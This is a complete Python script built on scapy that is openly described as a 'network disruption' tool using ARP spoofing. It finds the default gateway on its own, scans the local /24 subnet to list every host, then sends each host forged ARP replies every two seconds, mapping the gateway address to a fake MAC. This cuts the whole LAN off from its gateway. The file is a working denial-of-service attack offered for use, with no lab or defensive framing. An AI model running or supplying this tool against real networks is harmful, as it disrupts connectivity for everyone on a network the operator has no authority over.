import argparse
import platform
import subprocess
import sys
import time
import logging
import random
from scapy.all import (
    Ether,
    ARP,
    sendp,
    conf,
    get_if_list,
    get_working_if,
    srp,
    getmacbyip,
    get_if_addr
)

class NetworkDisruptor:
    def __init__(self, fake_mac: str = None, gateway_ip: str = None, interface: str = None):
        self.fake_mac = fake_mac or self._generate_private_mac()
        self.gateway_ip = gateway_ip or self._get_default_gateway()
        self.interface = interface or get_working_if()
        self.os_type = platform.system().lower()
        
        # Configure logging
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s'
        )
        self.logger = logging.getLogger(__name__)

    def disrupt_network(self) -> None:
        """Send fake ARP responses to disrupt the network."""
        self.logger.info("Starting network disruption...")
        self.logger.info(f"Using fake MAC: {self.fake_mac}")
        self.logger.info(f"Targeting gateway IP: {self.gateway_ip}")
        try:
            while True:
                targets = self._get_lan_targets()
                for target_ip in targets:
                    self._send_fake_arp(target_ip, self.fake_mac)
                time.sleep(2)  # Send ARP packets every 2 seconds
        except KeyboardInterrupt:
            self.logger.info("Network disruption stopped by user")
        except Exception as e:
            self.logger.error(f"Disruption error: {str(e)}")

    def _get_lan_targets(self) -> list:
        """Discover all IP addresses on the LAN except the local machine."""
        self.logger.info("Scanning LAN for targets...")
        try:
            # Get the local IP address
            local_ip = get_if_addr(self.interface)
            
            # Scan the LAN for all devices
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=f"{local_ip}/24"), 
                        timeout=2, verbose=False, iface=self.interface)
            
            # Extract IP addresses from the responses, excluding the local machine
            targets = [response[1].psrc for response in ans if response[1].psrc != local_ip]
            self.logger.info(f"Found {len(targets)} targets on the LAN")
            return targets
        except Exception as e:
            self.logger.error(f"Failed to scan LAN: {str(e)}")
            return []

    def _send_fake_arp(self, target_ip: str, fake_mac: str) -> None:
        """Send a fake ARP response to a target IP."""
        arp_response = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
            op=2,          # ARP Reply
            pdst=target_ip,
            hwdst=fake_mac,
            psrc=self.gateway_ip,
            hwsrc=fake_mac
        )
        sendp(arp_response, iface=self.interface, verbose=False)
        self.logger.info(f"Sent fake ARP response to {target_ip} with MAC {fake_mac}")

    def _generate_private_mac(self) -> str:
        """Generate a modern privacy-preserving MAC address."""
        # Set local administration bit and unicast bit
        first_byte = 0x02
        
        # Generate remaining random bytes
        random_bytes = [random.randint(0, 255) for _ in range(5)]
        
        # Combine and format as MAC address
        mac_bytes = [first_byte] + random_bytes
        return ":".join([f"{b:02x}" for b in mac_bytes])

    def _get_default_gateway(self) -> str:
        """Determine the default gateway IP address."""
        try:
            if self.os_type == "windows":
                result = subprocess.run(["ipconfig"], capture_output=True, text=True)
                for line in result.stdout.splitlines():
                    if "Default Gateway" in line:
                        return line.split(":")[1].strip()
            elif self.os_type == "linux":
                result = subprocess.run(["ip", "route"], capture_output=True, text=True)
                for line in result.stdout.splitlines():
                    if "default via" in line:
                        return line.split()[2]
            elif self.os_type == "darwin":  # macOS
                result = subprocess.run(["netstat", "-nr"], capture_output=True, text=True)
                for line in result.stdout.splitlines():
                    if "default" in line:
                        return line.split()[1]
            
            self.logger.error(f"Could not automatically determine gateway IP for {self.os_type}")
            sys.exit(1)
        except Exception as e:
            self.logger.error(f"Failed to determine default gateway: {str(e)}")
            sys.exit(1)

def main():
    parser = argparse.ArgumentParser(
        description="Cross-platform network disruption using ARP spoofing"
    )
    parser.add_argument(
        "--fake-mac",
        help="Fake MAC address to use in ARP responses (optional, privacy-preserving MAC will be generated if not provided)",
        default=None
    )
    parser.add_argument(
        "--gateway-ip",
        help="Gateway IP address (optional, will be auto-detected if not provided)",
        default=None
    )
    parser.add_argument(
        "--interface",
        help="Network interface to use (optional)",
        default=None
    )
    
    args = parser.parse_args()
    
    disruptor = NetworkDisruptor(
        fake_mac=args.fake_mac,
        gateway_ip=args.gateway_ip,
        interface=args.interface
    )
    
    disruptor.disrupt_network()

if __name__ == "__main__":
    main()
